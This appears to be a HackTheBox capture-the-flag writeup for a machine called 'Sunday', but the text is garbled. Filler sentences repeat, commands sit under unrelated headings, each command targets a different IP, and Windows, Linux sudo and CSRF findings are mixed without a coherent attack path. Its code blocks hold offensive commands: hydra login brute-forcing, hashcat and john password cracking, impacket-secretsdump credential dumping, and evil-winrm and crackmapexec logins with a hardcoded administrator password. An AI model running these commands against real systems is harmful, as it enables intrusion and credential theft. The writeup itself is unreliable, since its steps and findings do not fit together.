---
TitleSEO: "HackTheBox — Sunday (Insane Windows) | ZureFX"
TitlePost: "HackTheBox — Sunday (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Sunday. SeImpersonatePrivilege and DLL Hijacking to achieve insane compromise on Windows."
Keywords: "reversing, linux, ctf, active directory, hackthebox, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-sunday-673.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-sunday-673/"
Date: "2024-02-25"
Tags: "Reversing, Linux, CTF, Active Directory, HackTheBox, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-sunday-673"
Permalink: "/writeups/htb-sunday-673.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Sunday** is rated **Insane** on HackTheBox. It runs **Windows** and the IP address during this analysis was `10.123.147.186`.

### Objectives

The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.234.46 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p23,5985,3306 10.39.93.216 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.51.15.135
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.26.77.123 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

### SMB Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

```bash
evil-winrm -i 10.70.78.135 -u administrator -p 'P@ssw0rd!'
```

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

Key finding: **CSRF**.

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
nmap -sCV -p53,587,143 10.104.68.60 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p993,139,110 10.122.63.210 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.32.252.95/FUZZ
nmap -sCV -p5986,443,443 10.61.88.204 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.82.114.227 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.110.245.174/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.18.135.128 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.23.215.156 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `msfvenom`
- `GetNPUsers`
- `gobuster`
- `sharphound`
- `impacket`
- `evil-winrm`

### Key Takeaways

- SeImpersonatePrivilege
- DLL Hijacking
- Sudo Misconfiguration
- CSRF
